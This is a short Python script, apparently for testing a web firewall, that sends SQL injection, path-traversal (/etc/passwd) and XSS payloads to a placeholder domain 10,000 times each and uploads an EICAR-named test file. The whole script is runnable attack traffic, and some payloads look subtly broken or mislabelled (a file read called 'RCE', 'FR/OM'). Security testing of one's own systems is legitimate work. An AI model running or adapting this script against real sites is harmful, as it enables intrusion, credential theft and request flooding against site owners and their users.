import requests
import os


site_to_attack = "https://YOUR_DOMAIN"

sql_attack = "?**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/%27tom"
rce_attack = "?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd"
xss_attack = "?globalHtml=%3Csvg%20on%20onContextMenu=alert(1337)%3E"

iteration = 10000

def executeSqlAttack():
    attackUrl = site_to_attack + sql_attack

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl)
        


def executeRceAttack():
    attackUrl = site_to_attack  + rce_attack

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl)


def executeXssAttack():
    attackUrl = site_to_attack  + xss_attack

    for i in range (0,iteration):
        session = requests.Session()
        r = session.get(attackUrl)


def maliciousFileUpload():
    currDir = os.getcwd()
    malicious_file = {'file': open(currDir + "/eicar-adobe-acrobat-attachment.pdf", 'rb')}
    r = requests.post(site_to_attack, files=malicious_file)



#executeSqlAttack()
executeXssAttack()
#executeRceAttack()
